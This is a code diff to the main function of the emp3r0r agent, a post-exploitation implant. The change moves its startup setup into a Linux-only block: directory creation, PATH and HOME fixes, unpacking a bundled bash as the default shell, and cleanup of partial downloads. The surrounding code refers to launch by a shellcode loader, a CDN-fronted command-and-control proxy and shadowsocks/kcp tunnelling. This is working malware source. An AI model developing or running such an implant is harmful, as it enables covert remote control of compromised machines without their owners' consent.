@@ -168,58 +168,59 @@ func main() {
 		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 	}
 
-	// mkdir -p UtilsPath
-	// use absolute path
-	// TODO find a better location for temp files
-	if !util.IsExist(agent.RuntimeConfig.UtilsPath) {
-		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0o700)
-		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
-	}
-
-	// PATH
-	agent.SetPath()
-
-	// set HOME to correct value
-	u, err := user.Current()
-	if err != nil {
-		log.Printf("Get user info: %v", err)
-	} else {
-		os.Setenv("HOME", u.HomeDir)
-	}
-
-	// extract bash
-	err = agent.ExtractBash()
-	if err != nil {
-		log.Printf("[-] Cannot extract bash: %v", err)
-	}
-	emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
-	if runtime.GOOS == "windows" {
-		emp3r0r_data.DefaultShell = "elvsh"
-	} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
-		emp3r0r_data.DefaultShell = "/bin/bash"
-		if !util.IsFileExist(emp3r0r_data.DefaultShell) {
-			emp3r0r_data.DefaultShell = "/bin/sh"
-		}
-	}
-
-	// remove *.downloading files
-	err = filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
-		if err == nil {
-			if strings.HasSuffix(info.Name(), ".downloading") {
-				os.RemoveAll(path)
+	if runtime.GOOS == "linux" {
+		// mkdir -p UtilsPath
+		// use absolute path
+		if !util.IsExist(agent.RuntimeConfig.UtilsPath) {
+			err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0o700)
+			if err != nil {
+				log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
 			}
 		}
-		return nil
-	})
-	if err != nil {
-		log.Printf("Cleaning up *.downloading: %v", err)
-	}
 
-	if run_from_guardian_shellcode {
-		log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
-			os.Getpid(), os.Getppid())
+		// PATH
+		agent.SetPath()
+
+		// set HOME to correct value
+		u, err := user.Current()
+		if err != nil {
+			log.Printf("Get user info: %v", err)
+		} else {
+			os.Setenv("HOME", u.HomeDir)
+		}
+
+		// extract bash
+		err = agent.ExtractBash()
+		if err != nil {
+			log.Printf("[-] Cannot extract bash: %v", err)
+		}
+		emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
+		if runtime.GOOS == "windows" {
+			emp3r0r_data.DefaultShell = "elvsh"
+		} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+			emp3r0r_data.DefaultShell = "/bin/bash"
+			if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+				emp3r0r_data.DefaultShell = "/bin/sh"
+			}
+		}
+
+		// remove *.downloading files
+		err = filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
+			if err == nil {
+				if strings.HasSuffix(info.Name(), ".downloading") {
+					os.RemoveAll(path)
+				}
+			}
+			return nil
+		})
+		if err != nil {
+			log.Printf("Cleaning up *.downloading: %v", err)
+		}
+
+		if run_from_guardian_shellcode {
+			log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
+				os.Getpid(), os.Getppid())
+		}
 	}
 
 	// if the agent's process name is not "emp3r0r"
@@ -308,14 +309,6 @@ test_agent:
 			}
 		}()
 		agent.RuntimeConfig.C2TransportProxy = cdnproxyAddr
-	}
-
-	// agent root
-	if !util.IsExist(agent.RuntimeConfig.AgentRoot) {
-		err = os.MkdirAll(agent.RuntimeConfig.AgentRoot, 0o700)
-		if err != nil {
-			log.Printf("MkdirAll %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
 	}
 
 	// enable shadowsocks / kcp
